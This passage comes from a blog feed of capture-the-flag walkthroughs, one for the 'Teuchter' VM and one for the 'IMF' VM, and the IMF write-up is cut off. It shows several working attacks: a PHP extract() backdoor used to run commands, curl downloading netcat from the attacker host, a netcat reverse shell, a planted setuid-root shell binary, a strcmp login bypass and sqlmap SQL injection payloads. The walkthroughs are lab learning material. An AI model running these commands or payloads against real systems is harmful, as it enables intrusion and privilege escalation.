<p>Back to the challenge&hellip;but it would be easier if Ah had some Irn-Bru! At this point, the only actionable hint Ah could understand was the one about phpinfo. There is no third video on the page, so Ah just tried navigating to <a href="http://192.168.145.131/flicks/phpinfo.php,">http://192.168.145.131/flicks/phpinfo.php,</a> which didn&rsquo;t work. Following on the hint about .pht extensions, Ah changed it to <a href="http://192.168.145.131/flicks/phpinfo.pht">http://192.168.145.131/flicks/phpinfo.pht</a> and got a blank page instead.</p>

<p>After some Googling and drooling over Irn-Bru, Ah found a blog post about <a href="https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html">PHP Backdoors: Hidden With Clever Use of Extract Function</a>. It explains about a seemingly innocuous backdoor with the code:</p>

<p><code>
@extract ($_REQUEST);
@die ($ctime($atime));
</code></p>

<blockquote><p>The extract() function imports variables into the local symbol table from an array.</p>

<p>This function uses array keys as variable names and values as variable values. For each element it
will create a variable in the current symbol table.</p></blockquote>

<p>The blog post is a very interesting read, and the applicable item is that the code is extracting content sent via GET/POST requests and creating variables that are then executed with the format <code>execute ctime with atime as argument</code></p>

<p>Following the example, running <a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=whoami</a> returns www-data, so we have achieved command execution! Time for an Irn-Bru break&hellip;</p>

<p>Doing very light enumeration, Ah found out that netcat is available on the target, so Ah fired up a listener and tried using netcat to serve a shell on my listener, but it didn&rsquo;t work. So Ah used Python&rsquo;s SimpleHTTPServer to transfer my netcat to the target system. Note that ye have to use URL encoding: <code><a href="http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc">http://192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=curl%20http%3A%2F%2F192.168.145.129%2Fnc%20--output%20nc</a></code></p>

<p>The binary was downloaded to <code>/var/www/html/flicks</code>. Ah made it executable and ran it, but nothing happened. Next, Ah moved it to /tmp and ran it from there with <code>192.168.145.131/flicks/phpinfo.pht?ctime=system&amp;atime=%2Ftmp%2Fnc%20192.168.145.129%208080%20-e%20%2Fbin%2Fbash</code> and it worked:</p>

<p><code>
nc -vnlp 8080
listening on [any] 8080 ...
connect to [192.168.145.129] from (UNKNOWN) [192.168.145.131] 49172
whoami
www-data
</code></p>

<p>We have a reverse shell, but it&rsquo;s very limited. The usual Python shell spawning didn&rsquo;t work, because on the box there&rsquo;s actually Python 3. Which only changes things slightly: <code>python3 -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;</code></p>

<p><code>
python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@teuchter:/var/www/html/flicks$ ls /home
ls /home
cpgrogan  jkerr  proclaimers
</code></p>

<p>Inside cpgrogan there&rsquo;s a kochanski directory that we&rsquo;re not permitted to view. In jkerr&rsquo;s home there&rsquo;s an empty .sudo_as_admin_successful file, but we find a hint about jkerr&rsquo;s password:</p>

<p>```
www-data@teuchter:/home/jkerr$ cat login.txt
cat login.txt
Jim,</p>

<p>Ah decided to rename yer account to jkerr and reset the password
ye&rsquo;ll find it in the photo. Just remember the decode password
dosn&rsquo;t have a space.</p>

<p>If ye can&rsquo;t figure it out, it&rsquo;s the new name for Jonny &amp; the
Self-Abusers&hellip;
```</p>

<p>And inside proclaimers there are 2 directories. We can&rsquo;t enter 500miles, but inside letterfromamerica there are 2 interesting files belonging to root:</p>

<p><code>
www-data@teuchter:/home/proclaimers/letterfromamerica$ ls -alh
ls -alh
total 164K
drwxr-xr-x 2 proclaimers proclaimers 4.0K Aug 11  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rwsr-xr-x 1 root        root        151K Aug 11  2016 semaphore
-r-Sr-sr-t 1 root        root          42 Jul  9  2016 test
</code></p>

<p>Inside test there is some kind of message, stating that &ldquo;So Claire was right about those wildcards&rdquo;, and semaphore is an executable. Running it gives a shell under the same user account. Probably need more information (or Irn-Bru) before exploiting this.</p>

<p>Back to the next step, did a su to jkerr and used <em>breakfastclub</em> as a password and it worked! Ah used Python to transfer the images to my machine and broke my shell in the process:</p>

<p><code>
jkerr@teuchter:~$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET / HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:23] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:23] "GET /robots.txt HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:24] code 404, message File not found
192.168.145.129 - - [13/Oct/2018 18:33:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.145.129 - - [13/Oct/2018 18:33:27] "GET /promisedyeamiracle.jpg HTTP/1.1" 200 -
192.168.145.129 - - [13/Oct/2018 18:33:29] "GET /breakfastclub.jpg HTTP/1.1" 200 -
</code></p>

<p>An Irn-Bru would have prevented that mistake! After redoing the steps, Ah ran exiftool on the downloaded images and found a base64 encoded string in promisedyeamiracle.jpg:</p>

<p><code>
Copyright                       : Z2VtaW5pCg==
</code></p>

<p>Decoded, it means <em>gemini</em>. Ah didn&rsquo;t know what to do with this, so Ah googled for the other user accounts.</p>

<p>cpgrogan:</p>

<blockquote><p>Claire Patricia Grogan (born 17 March 1962), known professionally as Clare Grogan or sometimes as
C. P. Grogan, is a Scottish actress and singer. She is best known as the lead singer of the 1980s
new wave music group Altered Images and for supporting roles in the 1981 film Gregory&rsquo;s Girl and
the science fiction sitcom Red Dwarf as the first incarnation of Kristine Kochansk</p></blockquote>

<p>proclaimers:</p>

<blockquote><p>The Proclaimers are a Scottish music duo composed of twin brothers Charlie and Craig Reid (born 5
March 1962). They are best known for their songs &ldquo;I&rsquo;m Gonna Be (500 Miles)&rdquo;, &ldquo;Sunshine on Leith&rdquo;,
&ldquo;I&rsquo;m On My Way&rdquo; and &ldquo;Letter from America&rdquo;, and their singing style with a Scottish accent</p></blockquote>

<p>Well, we don&rsquo;t need an Irn-Bru to connect the dots, gemini, twins! That is actually the password for the proclaimers account. Now to get back to the folders from before:</p>

<p><code>
proclaimers@teuchter:~/500miles$ ls -alh
ls -alh
total 228K
drwx------ 2 proclaimers proclaimers 4.0K Jul  9  2016 .
drwxr-xr-x 5 proclaimers proclaimers 4.0K Sep 23  2016 ..
-rw-rw---- 1 proclaimers proclaimers 8.0K Jun 30  2016 choclate_lassie.jpg
-rw-rw---- 1 proclaimers proclaimers  97K Jun 30  2016 city_discovery.jpg
-rw-rw---- 1 proclaimers proclaimers 8.5K Jun 30  2016 night_oot_teuchters.jpg
-rw-rw---- 1 proclaimers proclaimers  87K Jun 30  2016 Restless-Natives-Scotland.jpg
-rw-rw---- 1 proclaimers proclaimers  11K Jun 30  2016 SPT_red.jpg
</code></p>

<p>Ah downloaded the images in case of need and out of curiosity. Then it was back to the semaphore. Ah grepped for files containing the word semaphore, and tried avoiding being flooded by irrelevant results like libraries. Eventually, Ah got a hit under <em>/usr/local</em>, in the <code>/usr/local/bin/numpties.sh</code> file:</p>

<p>```</p>

<h1>!/bin/sh</h1>

<h2>Right, time to sort out these numpties that put PHP shells on ma server!</h2>

<h2>Steal a copy to examine later</h2>

<p>/bin/tar czvf /root/shells.tgz /var/www/html/*.php</p>

<h2>Aww they dobbers with primative Egpytian Encryption can away and raffle themselves</h2>

<p>sudo apt-get -y purge openssh-server sftp wget</p>

<h2>Delete the shells to annoy the eejits</h2>

<p>/bin/rm -rf /var/www/html/*.php</p>

<h2>Plant a semaphore in to alert the monitoring system</h2>

<p>if /usr/bin/[ -f /home/proclaimers/letterfromamerica/semaphore ]
  then</p>

<pre><code>/bin/chown root.root /home/proclaimers/letterfromamerica/semaphore
/bin/chmod 4755 /home/proclaimers/letterfromamerica/semaphore
</code></pre>

<p>fi
```</p>

<p>Back to the dictionaries it is, and memory alert, Ah remembered being called a numpty once!</p>

<blockquote><p>numpty &ndash; A person who is incapable of performing the simplest of task correctly. Usual symptoms
include poor hand-eye coordination, zero common sense and the general illusion that they are
special (caused by parents referring to them as such and the numpty not fully grasping the meaning
implied).</p>

<p>Common causes are being dropped as a baby or repeated heavy blows to head in later life.</p>

<p>dobber &ndash; A Glasgow term for a dick head or in general just a stupid cunt.</p></blockquote>

<p>Now for the code, attempts to put PHP shells on the server fail because the shells get deleted. Also, a couple of file transfer utilities have been removed (the reason why Ah resorted to curl). It looks like this might be used in a cronjob. Finally, if the semaphore file exists, its owner is changed to root and the SUID bit is set. Which means, we can create a semaphore file that would allow us to become root if it were SUID.</p>

<p>On my box, Ah compiled an executable (no GCC on the target) with the following C code:</p>

<p>```</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(void)
{
  setuid(0); setgid(0); system(&ldquo;/bin/bash&rdquo;);
}
```</p>

<p>Ah made it executable for everyone and transfered it to the target, again with curl:</p>

<p>```
curl <a href="http://192.168.145.129/rootme">http://192.168.145.129/rootme</a> &mdash;output ./semaphore   <br/>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</p>

<pre><code>                             Dload  Upload   Total   Spent    Left  Speed
</code></pre>

<p>100 16712  100 16712    0     0  1002k      0 &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; 1020k
```</p>

<p>Waited a while, thought about some Irn-Bru, came back and got root!</p>

<p><code>
./semaphore
root@teuchter:~/letterfromamerica#
</code></p>

<p>Finding the flag is usually the last step, but not on knightmare&rsquo;s machines!</p>

<p><code>
oot@teuchter:/root# ls -alh
ls -alh
total 1.1M
drwx------  5 root root 4.0K Nov  2  2016 .
drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
drwx------  2 root root 4.0K Nov  2  2016 .aptitude
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Nov  2  2016 .cache
-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
-rw-------  1 root root 3.4K Nov  2  2016 .viminfo
</code></p>

<p>Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:</p>

<p>```
root@teuchter:/root# cat flag.txt
cat flag.txt
Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again&hellip;?</p>

<p>Y'all know this aint the correct flag!
```</p>

<p>Looking around further:</p>

<p><code>
root@teuchter:/root/re-record-not-fade-away# ls
ls
FeelsLikeHeaven  on
cat FeelsLikeHeaven
Yer pure no gonna find the flag... A pit it in a bottle of Red Kola
</code></p>

<p>The directory tree goes&hellip;on..and on&hellip;Ah used a Python script to solve this annoyance:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">startdir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">.&amp;</span><span class="n">rsquo</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">subdir</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">startdir</span><span class="p">):</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">print</span><span class="p">(</span><span class="s">&#39;Found directory: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">dir</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">f</span><span class="p">)</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>```
root@teuchter:/root/re-record-not-fade-away# python3 dir.py
python3 dir.py
Found directory: .</p>

<pre><code>FeelsLikeHeaven
dir.py
</code></pre>

<p>Found directory: ./on
Found directory: ./on/and
Found directory: ./on/and/on
Found directory: ./on/and/on/and
Found directory: ./on/and/on/and/on
Found directory: ./on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on
Found directory: ./on/and/on/and/on/and/on/and/on/and
Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston</p>

<pre><code>TeuchterESX.zip
</code></pre>

<p>```</p>

<p>Inside this madness there&rsquo;s a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is <em>Teuchter</em>:</p>

<p><code>
unzip TeuchterESX.zip
Archive:  TeuchterESX.zip
[TeuchterESX.zip] TeuchterESX.vmdk password:
  inflating: TeuchterESX.vmdk        
</code></p>

<p>A VMDK disk. There&rsquo;s actually a hint for this inside root&rsquo;s crontab entries:</p>

<p>```</p>

<h2>So vmfs-tools package eh&hellip;.?</h2>

<p>*/5 * * * * /bin/sh /usr/local/bin/numpties.sh > /dev/null 2>&amp;1
```</p>

<p>Let&rsquo;s see what the package does:</p>

<p><code>
apt-cache show vmfs-tools
Package: vmfs-tools
Source: vmfs-tools (0.2.5-1)
Version: 0.2.5-1+b2
Installed-Size: 256
Maintainer: Mike Hommey &lt;glandium@debian.org&gt;
Architecture: amd64
Depends: libc6 (&gt;= 2.14), libfuse2 (&gt;= 2.6), libuuid1 (&gt;= 2.16)
Size: 53964
SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
MD5sum: ee9aa037a69d28f6db694632d0f7a106
Description: Tools to access VMFS filesystems
 VMFS is a clustered filesystem designed to store virtual machine disks for
 VMware ESX or ESXi Server hosts. This set of tools allows to access these
 filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
 .
 Only read access is available at the moment, but write access is under
 works. Multiple extents are supported.
 .
 The VMFS can be accessed with a command line tool or mounted through a
 userspace filesystem (FUSE-based).
Description-md5: 0cdea504f6c5a9da0070eeda2f011352
Tag: admin::filesystem, admin::kernel, admin::virtualization,
 implemented-in::c, role::program
Section: otherosfs
Priority: extra
Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb
</code></p>

<p>Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing <em>ddb.virtualHWVersion</em> to a version matching the VM&rsquo;s compatibility, but Ah haven&rsquo;t tried that. After doing it like that, Ah was able to see the disk under <em>/dev/sdb1</em>:</p>

<p>```
fdisk -l
Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688</p>

<p>Device     Start     End Sectors Size Type
/dev/sdb1   2048 4194270 4192223   2G VMware VMFS</p>

<p>Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa89dd27d</p>

<p>Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
/dev/sda2       79695870 83884031  4188162   2G  5 Extended
/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris
```</p>

<p>Now Ah could mount it and see what&rsquo;s inside:</p>

<p><code>
root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
root@kali:~# ls /mnt/vmdk
hint.txt  redkola
</code></p>

<p>The hint mentions a password made of 25 characters that we should be able to find from what we&rsquo;ve been through:</p>

<p>```
cat hint.txt
Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.</p>

<p>Ah took out the spaces but it&rsquo;s 25 characters but the Wikipedia page will get it for ye.
```</p>

<p>In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:</p>

<p><code>
oot@kali:/mnt/vmdk/redkola# ls
redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
redkola_1.vmdk       redkola.nvram  redkola.vmx
</code></p>

<p>Ah mounted the ISO next:</p>

<p><code>
mount -o loop,ro redkola.iso /mnt/redkola
root@kali:/mnt/redkola# ls
glass_ch.jpg
</code></p>

<p><img class="center" src="/images/pentest/teuchter/glass_ch.jpg" title="&lsquo;glass cheque&rsquo; &lsquo;irn-bru!!!!!!&rsquo;" ></p>

<p>All that Irn-Bru! And with something extra, perhaps? Enter steghide!</p>

<h4>steghide</h4>

<blockquote><p>Steghide  is a steganography program that is able to hide data in various kinds of
image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making
the embedding resistant against first-order statistical tests.</p>

<p>Features include the compression of the embedded  data,  encryption  of
the  embedded  data  and automatic integrity checking using a checksum.
The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
file. There are no restrictions on the format of the secret data.</p></blockquote>

<p>Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code></p>

<p>```
steghide info glass_ch.jpg
&ldquo;glass_ch.jpg&rdquo;:
  format: jpeg
  capacity: 3.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file &ldquo;realflag.txt&rdquo;:</p>

<pre><code>size: 972.0 Byte
encrypted: rijndael-128, cbc
compressed: yes
</code></pre>

<p>```</p>

<p>Aaand, after much pain, we have the flag!</p>

<p><code>
steghide extract -sf glass_ch.jpg
Enter passphrase:
wrote extracted data to "realflag.txt".
</code></p>

<p>Achievement unlocked: Unlimited Irn-Bru!</p>

<p>```
cat realflag.txt</p>

<p>Gaun Yersel Big Man! B-)</p>

<p>Congratulations for the fifth time on capturing this flag!</p>

<p>Yes, I know this VM has really got on your nerves, and that was the main
point&hellip;</p>

<p>I decided to have some fun with you, and hopefully you have learned some
new ways to look at things. You know, all this could have been avoided
if Siri just leanred what &ldquo;outwith&rdquo; means, I wouldn&rsquo;t have to build this
VM. I&rsquo;m trolling you again of course!</p>

<p>I hope this VM was fun for you, and I&rsquo;m sure you can now insult people
in another language :&ndash;)</p>

<p>Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
for trolling everyone.</p>

<p>Shout-outs yet again to #vulnhub for hosting a great learning tool and
being a great inspiration to make these VMs. A special thanks goes to
mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
for providing some valuable feedback and offering to host my CTF again.</p>

<pre><code>                                                       --Knightmare
</code></pre>

<p>```</p>

<p>This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven&rsquo;t figured it out, stands for Iron Brew! Cheers, knightmare!</p>

<p>Just gonna leave this here:</p>

<p><img class="center" src="/images/pentest/teuchter/irn-bru.jpg" title="&lsquo;irn-bru&rsquo; &lsquo;iron brew effect&rsquo;" ></p>

<p>And this:</p>

<ul>
<li><a href="https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/">https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/</a></li>
</ul>


<p>It&rsquo;s not over:</p>

<p>```</p>

<hr />

<p>/ When I&rsquo;m a burger, Ah want to be washed \
\ down with Irn-Bru                      /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack the IMF]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/06/hack-the-imf/"/>
    <updated>2018-10-06T02:45:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/06/hack-the-imf</id>
    <content type="html"><![CDATA[<p>The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.</p>

<p>The difficulty is Beginner/Moderate</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
</code></p>

<p>Only port 80 is open, so let&rsquo;s begin from there.</p>

<p><img class="center" src="/images/pentest/imf/home.png" title="&lsquo;homepage&rsquo; &lsquo;impossible mission force&rsquo;" ></p>

<p>So we learn that IMF stands for Impossible Mission Force and that it&rsquo;s a US intelligence agency. 3-letter agencies everywhere!</p>

<p><img class="center" src="/images/pentest/imf/projects.png" title="&lsquo;projects&rsquo; &lsquo;imf projects&rsquo;" ></p>

<p>The Projects page makes for a fun read and it also reveals that the site is using PHP.</p>

<p><img class="center" src="/images/pentest/imf/contact.png" title="&lsquo;contact&rsquo; &lsquo;imf contact&rsquo;" ></p>

<p>The contact page gives us some names and mail addresses:</p>

<ul>
<li>Roger S. Michaels &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#114;&#x6d;&#105;&#x63;&#x68;&#97;&#x65;&#x6c;&#x73;&#x40;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#97;&#x6c;">&#114;&#109;&#x69;&#99;&#104;&#97;&#x65;&#108;&#x73;&#x40;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;</a></li>
<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x61;&#107;&#x65;&#x69;&#x74;&#x68;&#64;&#105;&#x6d;&#102;&#46;&#108;&#111;&#99;&#x61;&#108;">&#97;&#x6b;&#x65;&#x69;&#116;&#x68;&#64;&#105;&#x6d;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#x6c;</a></li>
<li>Elizabeth R. Stone &ndash; <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x65;&#x73;&#116;&#x6f;&#110;&#101;&#x40;&#105;&#109;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#108;">&#101;&#x73;&#x74;&#x6f;&#110;&#x65;&#64;&#x69;&#x6d;&#x66;&#46;&#108;&#111;&#x63;&#97;&#x6c;</a></li>
</ul>


<h1>Flag #1 &ndash; Read the source</h1>

<p>The first flag can be found as a HTML comment in the source of the contact.php page:</p>

<p>```</p>

<!-- flag1{YWxsdGhlZmlsZXM=} -->


<p>```</p>

<p>Decoding the base64 flag gives the hint <code>allthefiles</code>.</p>

<h1>Flag #2 &ndash; JS includes</h1>

<p>I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn&rsquo;t find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:</p>

<p>```</p>

<pre><code>    &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
    &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
    &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;
</code></pre>

<p>```</p>

<p>Putting them all together gives the string <em>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</em>, which yields the second flag when decoded: <em>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</em>. This, in turn, gives the next hint: <code>imfadministrator</code></p>

<h1>Flag #3 &ndash; Exploiting PHP strcmp function</h1>

<p>With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:</p>

<p><img class="center" src="/images/pentest/imf/login.jpg" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>And in the source there&rsquo;s an interesting comment:</p>

<p>```</p>

<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->


<p>```</p>

<p>Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we&rsquo;d expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the <strong>strcmp()</strong> function:</p>

<p>strcmp(string1,string2)</p>

<p>This function returns:</p>

<p>```
0 &ndash; if the two strings are equal
&lt;0 &ndash; if string1 is less than string2</p>

<blockquote><p>0 &ndash; if string1 is greater than string2
```</p></blockquote>

<p>However, when reading through its <a href="https://secure.php.net/manual/en/function.strcmp.php">manual page</a>, there was a very interesting comment by chris at unix-ninja dot com:</p>

<p>```
strcmp() will return NULL on failure.</p>

<p>This has the side effect of equating to a match when using an equals comparison (==).
Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.</p>

<hr />

<h2>  Example</h2>

<p>$variable1 = array();
$ans === strcmp($variable1, $variable2);</p>

<p>This will stop $ans from returning a match;</p>

<p>Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.
```</p>

<p>If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we&rsquo;ll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:</p>

<p><code>
user=&lt;input&gt;&amp;pass=&lt;input&gt;
</code></p>

<p>For the user, I used Roger&rsquo;s username that we&rsquo;ve discovered earlier. And then passed the password as an array:</p>

<p><code>
user=rmichaels&amp;pass[]=fail
</code></p>

<p>And the login succeeded!</p>

<p><code>
flag3{Y29udGludWVUT2Ntcw==}
Welcome, rmichaels
IMF CMS
</code></p>

<p>The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=home">http://192.168.145.130/imfadministrator/cms.php?pagename=home</a></p>

<h1>Flag #4 &ndash; SQLi</h1>

<p><img class="center" src="/images/pentest/imf/cms.jpg" title="&lsquo;imf cms&rsquo; &lsquo;imf cms&rsquo;" ></p>

<p>The Upload Report page is under construction. The Disavowed list is redacted:</p>

<p><img class="center" src="/images/pentest/imf/list.png" title="&lsquo;list&rsquo; &lsquo;list&rsquo;" ></p>

<p>In the URL, observe how the pages are constructed:</p>

<p><code>
cms.php?pagename=disavowlist
</code></p>

<p>I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!</p>

<p><code>
 Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
</code></p>

<p>Time for sqlmap!</p>

<p>```
sqlmap -u <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=upload">http://192.168.145.130/imfadministrator/cms.php?pagename=upload</a> &mdash;cookie &ldquo;PHPSESSID=o5jl7cjuohite8ifu20fghfkq1&rdquo; &mdash;dbms=MySQL &mdash;dump-all</p>

<p>GET parameter &lsquo;pagename&rsquo; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</p>

<h2>sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:</h2>

<p>Parameter: pagename (GET)</p>

<pre><code>Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd

Type: error-based
Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy

Type: AND/OR time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind
Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
</code></pre>

<hr />

<p>[04:20:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
```</p>

<p>The output was huge, so here I left only the relevant part:</p>

<p><code>
Database: admin
Table: pages
[4 entries]
